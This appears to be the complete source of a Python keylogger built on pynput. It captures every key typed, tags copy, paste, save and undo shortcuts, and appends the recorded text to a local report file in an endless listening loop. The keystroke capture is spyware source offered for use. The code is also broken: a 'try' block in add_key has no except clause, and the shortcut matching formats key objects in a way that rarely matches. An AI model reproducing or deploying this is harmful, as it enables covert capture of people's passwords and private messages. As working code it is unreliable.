
#!/usr/bin/python

# Simple Keylogger using Pynput
# Author: Franco Barpp Gomes (https://github.com/Hyodar)

# -*- coding: utf-8 -*-

# Imported modules
# -----------------------------------------------------------------------------

from pynput import keyboard

# Constants
# -----------------------------------------------------------------------------

REPORT_PATH = 'report.tbdc'

# Classes
# -----------------------------------------------------------------------------

class KeyboardParser():

    def __init__(self, logger):
        self.text = ''
        self.press = []
        self.logger = logger

        self.KeyboardParserS = {
            'ctrl+c': '<<COPIEDTXT>>',
            'ctrl+v': '<<PASTEDTXT>>',
            'ctrl+s': '<<SAVE>>',
            'ctrl+z': '<<UNDO>>',
            'ctrl+y': '<<REDO>>',
            'ctrl+shift+z': '<<REDO>>'
        }

    def _clear_text(self):
        self.text = ''

    def _clear_press(self):
        self.press = []

    def press_key(self, key):
        if not key in self.press:
            self.press.append(key)

    def println(self, keypress):
        self.logger.log(self.text, keypress)
        self._clear_text()

    def parse_comm(self, key):

        n_keys = len(self.press)
        comm_str = self.KeyboardParserS.get('{}+{}'.format('+'.join(self.press), key), False)
                
        if comm_str:
            self.text += comm_str
            self._clear_press()
            return True
        
        return False

    def add_key(self, key):
        if key == keyboard.Key.tab:
            self.println('TAB')
        elif key == keyboard.Key.enter:
            self.println('ENTER')
        else:
            try:
                self.text += key.char

# -----------------------------------------------------------------------------

class Logger():

    def __init__(self, report_path):
        self.report_path = report_path

    def log(self, text, keypress):
        with open(self.report_path, 'a') as report:
            report.write("{} -> {}\n".format(text, keypress))

# Globals
# -----------------------------------------------------------------------------

logger = Logger(report_path=REPORT_PATH)
comm = KeyboardParser(logger=logger)

# Callbacks
# -----------------------------------------------------------------------------

def check_special_keys(key):

    return key == keyboard.Key.shift or \
           key == keyboard.Key.ctrl_l or \
           key == keyboard.Key.ctrl_r or \
           key == keyboard.Key.alt_l or \
           key == keyboard.Key.alt_r

def on_press(key):

    if key == keyboard.Key.shift:
        comm.press_key('shift')
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        comm.press_key('ctrl')
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        comm.press_key('alt')

def on_release(key):

    if check_special_keys(key):
        return None

    if not comm.parse_comm(key):
        comm.add_key(key)

# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------

def main():

    while True:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

if __name__ == '__main__':
    main()



